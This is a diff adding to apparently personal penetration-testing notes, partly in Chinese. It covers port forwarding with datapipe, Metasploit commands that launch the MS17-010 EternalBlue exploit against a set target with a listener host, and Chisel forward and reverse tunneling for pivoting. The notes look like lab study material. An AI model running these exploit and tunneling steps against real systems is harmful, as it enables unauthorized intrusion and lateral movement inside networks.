@@ -132,4 +132,41 @@ Datapipe
     datapipe 0.0.0.0 135 192.168.0.7 135
     datapipe 0.0.0.0 445 192.168.0.7 445
     datapipe 0.0.0.0 4444 172.19.19.18 4444
-![image](https://github.com/user-attachments/assets/504b6fc7-2354-4a87-b6c6-1f2487d2f114)
+![image](https://github.com/user-attachments/assets/c4a8f73a-b1d9-4d9a-96e0-b9658fea2989)
+
+    MS17_010
+    search ms17_010
+    use exploit/windows/smb/ms17_010_eternalblue
+    show options
+    set rhosts 172.19.19.70
+    set lhost 192.168.0.70
+    check
+    exploit
+![image](https://github.com/user-attachments/assets/4f5a10d9-d798-4482-8308-0d6bd20b6d97)
+![image](https://github.com/user-attachments/assets/82887d19-4b92-4e5e-9ad7-2f2a20817cda)
+
+Chisel
+---
+    目前有 Windows、Parrot 兩台電腦，想讓 Windows 連結 http://127.0.0.1:8888 就可以瀏覽 Parrot 電腦中的檔案目錄結構。
+    chisel server –p 443
+    chisel client <chisel_server>:443 <remote_addr>:445
+    Kali架設chisel server
+![image](https://github.com/user-attachments/assets/7a2ae0c7-f3b8-442e-a3f1-0e52251cd660)
+
+    Windows端下載Chisel
+[Chisel](https://github.com/jpillora/chisel/releases)
+
+    Windows Client連線
+![image](https://github.com/user-attachments/assets/47bc4b29-ad25-461b-b2c2-5c2d83bced0b)
+
+    瀏覽本機80，127.0.0.1:80
+    
+![image](https://github.com/user-attachments/assets/553a47c4-7661-4049-a3dd-20d0cd65be87)
+
+Chisel Reverse
+---
+    chisel server –p 443 --reverse 
+    chisel client <chisel_server>:443 R:<remote_addr>:445
+
+
+
